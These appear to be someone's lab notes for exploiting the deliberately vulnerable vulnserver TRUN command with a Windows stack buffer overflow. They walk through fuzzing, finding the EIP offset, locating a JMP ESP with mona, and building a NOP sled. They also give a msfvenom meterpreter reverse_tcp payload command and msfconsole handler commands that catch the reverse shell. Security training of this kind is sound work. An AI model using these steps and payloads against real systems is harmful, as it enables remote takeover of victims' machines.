
windows buffer overflow

turn anti virus off

static analysis
 // run powershell as admin, cd to dir of vuln server file
 // strings.exe vulnserver.exe
 // GUI > Properties


havioral analysis
 // RUN IT
 // netstat -anob
 // get-process | findstr /i vuln
 
dynamic analysis
 // open immunity debugger as admin.
 // run vulnserver and attach it
 // eip top right
 // click rewind, top left; click play, top left
 // verify windows defender is off


go to linux box
  // i named by file winbuff.py
 
<img width="588" height="585" alt="{B801876B-6B59-416B-8B9F-E17F5B754D29}" src="https://github.com/user-attachments/assets/59a2e37e-6bf3-4ef8-afe3-e445eb4477e4" />

 // changed `buf` to "TRUN /.:/"
 start our fuzzing
 // added a variable: `buf += "A" * 5000
 // rewind immunity again and press play

when ran our EIP changes to 41414141
go to wiremask again , change length to 5000 , copy the pattern into the `buf += "pattern"` without the multiplier

// rewind immunity again and press play

<img width="783" height="293" alt="{BC996539-0C83-4C40-B1D8-5CFD88B17BFE}" src="https://github.com/user-attachments/assets/789d4aaf-1a05-4951-acac-acc488cea2f5" />


// run the script again, get new EIP from immunity
// copy the NEW EIP into the registry offset on wiremask, find offset
// add the 4 B's into a buf += "b" * 4
<img width="768" height="291" alt="{A090398B-3D82-4FA2-8193-F721AB1F191A}" src="https://github.com/user-attachments/assets/5729d66b-e4c2-467e-aff8-c1a37afe7b87" />

ctrl + k in nano to delete a line


run and the EIP should be 42424242 - > you successfuly overwrote

time to find jump ESP location
.. bottom left of the screen theres a search box.. type in: `!mona modules`
this will search for unprotected dll's
<img width="1037" height="168" alt="{6CBF2C8E-D900-4236-A6B1-B897E3C6D266}" src="https://github.com/user-attachments/assets/99de257d-b3d3-443c-9255-c3a884cff5a9" />


looking for ALL FALSE. -> essfunc.dll

search for jump esp locations within the dll you located
the next mona command is `!mona jmp -r esp -m "essfunc.dll"`


<img width="1036" height="101" alt="image" src="https://github.com/user-attachments/assets/8ba1f069-8fd3-473e-9a55-511a41f27609" />

copy the first couple of them down and convert them

converting big endian to little endian:
space them out
62 50 11 af
add to buff variable
buf += "\xaf\x11\x50\x62"

add a NOP sled to the buf aswell: `buf += "\x90" * 10

should look like this:
<img width="689" height="451" alt="{79A88CFE-DE27-4589-9015-454B317AEA1B}" src="https://github.com/user-attachments/assets/6fecdfb3-4f51-4f69-a436-b5d178a0526b" />


now lets make our payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=linux-ops lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.143.86 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python

<img width="789" height="631" alt="{73FF8C86-1B4C-4A30-A837-0DA3322CBB09}" src="https://github.com/user-attachments/assets/273b7334-0ef3-4b3c-acd6-ee23433c4c29" />

copy the whole payload except the first line, that will reset the `buf` variable

<img width="620" height="552" alt="{7C95339D-CBA3-4F16-91AC-F7BF62383EDF}" src="https://github.com/user-attachments/assets/0dd75c80-dd5c-464e-a26c-c644cb53155d" />
<img width="620" height="357" alt="{FD81A650-DF04-4343-A615-F6341FD27D1A}" src="https://github.com/user-attachments/assets/0ff5945d-4d04-482d-840e-642896e171bc" />


setup your msfconsole to catch the reverse shell
commands:
 msfconsole
 use multi/handler
 show options
 set payload windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 exploit
 
 <img width="767" height="617" alt="{147C4C05-88C9-4E74-A767-65E6BA5A8E23}" src="https://github.com/user-attachments/assets/bf569128-7e40-41a6-8201-33cbf0b2f54c" />

go back to windows, rewind, press play, check security settings

run the python script on linux, check msfconsole
<img width="780" height="124" alt="{9F865A9E-3937-4E69-AA46-CBA9E6DE12F9}" src="https://github.com/user-attachments/assets/3c6d9abe-d504-45ff-803f-63c2ec662f9b" />


